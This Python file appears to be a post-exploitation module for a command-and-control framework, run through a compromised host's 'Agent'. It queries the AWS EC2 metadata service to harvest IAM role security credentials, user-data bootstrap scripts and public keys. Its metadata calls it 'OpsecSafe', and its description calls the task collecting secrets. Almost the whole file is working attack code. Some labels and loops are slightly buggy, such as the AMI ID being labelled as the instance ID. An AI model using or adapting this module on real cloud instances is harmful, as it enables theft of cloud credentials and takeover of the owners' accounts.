from lib.common import helpers
import pdb

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Linux Amazon AWS EC2 Metadata Service Enumeration',

            # list of one or more authors for the module
            'Author': ['@TweekFawkes'],

            # more verbose multi-line description of the module
            'Description': ("Automates the collection of secrets within user data, roles, and public keys."),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : True,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': ['Modified from SoMeta: https://gist.github.com/TweekFawkes/9da5ccb9257420aa134887b4afa19b87']
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        script = """
print "[*] Started"
import urllib2

def curlMetadataService(sDesc, sUrl):
    try:
        print "[*] Collecting the %s from the Metadata Service: %s" %(sDesc, sUrl)
        oResponse = urllib2.urlopen(sUrl)
        iResponseCode = oResponse.getcode()
        sResponseCode = str(iResponseCode)
        #sResponseHeader = oResponse.info()
        sResponseContent = oResponse.read()
        if iResponseCode == 200:
            print "[+] %s : %s" %(sDesc, sResponseContent)
        else:
            print "[!] HTTP Response Code %s from URL: %s" %(sResponseCode, sUrl)
    except:
        print "[-] The %s is not found within the Metadata Service: %s" %(sDesc, sUrl)

def newUrl(sUrl, sLine):
    if sUrl.endswith('/'):
        sNewUrl = sUrl + sLine
    else:
        sNewUrl = sUrl + '/' + sLine
    return sNewUrl

try:
    sUrl = 'http://169.254.169.254/latest/meta-data/ami-id'
    sDesc = 'Instance ID'
    curlMetadataService(sDesc, sUrl)
    #
    sUrl = 'http://169.254.169.254/latest/meta-data/public-hostname'
    sDesc = 'Internet Facing Hostname'
    curlMetadataService(sDesc, sUrl)
    #
    sUrl = 'http://169.254.169.254/latest/meta-data/local-hostname'
    sDesc = 'Internal Hostname'
    curlMetadataService(sDesc, sUrl)
    #
    sUrl = 'http://169.254.169.254/latest/user-data'
    sDesc = 'User Data (e.g. boot strap scripts)'
    curlMetadataService(sDesc, sUrl)
    #
    sUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
    sDesc = 'IAM roles associated with the instance'
    try:
        oResponse = urllib2.urlopen(sUrl)
        iResponseCode = oResponse.getcode()
        sResponseCode = str(iResponseCode)
        sResponseHeader = oResponse.info()
        sResponseContent = oResponse.read()
        if iResponseCode == 200:
            #print(sResponseContent)
            lResponseContent = sResponseContent.splitlines()
            for sLine in lResponseContent:
                sUrlTwo = newUrl(sUrl, sLine)
                try:
                    oResponseTwo = urllib2.urlopen(sUrlTwo)
                    iResponseCodeTwo = oResponseTwo.getcode()
                    sResponseCode = str(iResponseCodeTwo)
                    sResponseHeaderTwo = oResponseTwo.info()
                    sResponseContentTwo = oResponseTwo.read()
                    if iResponseCodeTwo == 200:
                        print "[+] %s : %s" %(sDesc, sResponseContentTwo)
                    else:
                        print "[!] HTTP Response Code %s from URL: %s" %(iResponseCodeTwo, sUrlTwo)
                except:
                    print "[-] The %s is not found within the Metadata Service: %s" %(sDesc, sUrlTwo)
        else:
            print "[!] HTTP Response Code %s from URL: %s" %(sResponseCode, sUrl)
    except:
        print "[-] The %s is not found within the Metadata Service: %s" %(sDesc, sUrl)
    #
    sUrl = 'http://169.254.169.254/latest/meta-data/public-keys/'
    sDesc = 'Public Keys associated with the instance'
    try:
        oResponse = urllib2.urlopen(sUrl)
        iResponseCode = oResponse.getcode()
        sResponseCode = str(iResponseCode)
        sResponseHeader = oResponse.info()
        sResponseContent = oResponse.read()
        if iResponseCode == 200:
            #print(sResponseContent)
            lResponseContent = sResponseContent.splitlines()
            for sLine in lResponseContent:
                sLine = sLine[:1]
                sUrlTwo = newUrl(sUrl, sLine)
                try:
                    oResponseTwo = urllib2.urlopen(sUrlTwo)
                    iResponseCodeTwo = oResponseTwo.getcode()
                    sResponseCodeTwo = str(iResponseCodeTwo)
                    sResponseHeaderTwo = oResponseTwo.info()
                    sResponseContentTwo = oResponseTwo.read()
                    if iResponseCodeTwo == 200:
                        try:
                            sUrlThree = newUrl(sUrlTwo, sResponseContentTwo)
                            oResponseThree = urllib2.urlopen(sUrlThree)
                            iResponseCodeThree = oResponseThree.getcode()
                            sResponseCodeThree = str(iResponseCodeThree)
                            sResponseHeaderThree = oResponseThree.info()
                            sResponseContentThree = oResponseThree.read()
                            if iResponseCodeThree == 200:
                                print "[+] %s : %s" %(sDesc, sResponseContentThree)
                            else:
                                print "[!] HTTP Response Code %s from URL: %s" %(iResponseCodeThree, sUrlThree)
                        except:
                            print "[-] The %s is not found within the Metadata Service: %s" %(sDesc, sUrlThree)
                except:
                    print "[!] HTTP Response Code %s from URL: %s" %(sResponseCodeTwo, sUrlTwo)
    except:
        print "[-] The %s is not found within the Metadata Service: %s" %(sDesc, sUrl)
except Exception as e:
    print "[-] The %s is not found within the Metadata Service: %s" %(sDesc, sUrl)

print "[*] Finished"
"""
        return script
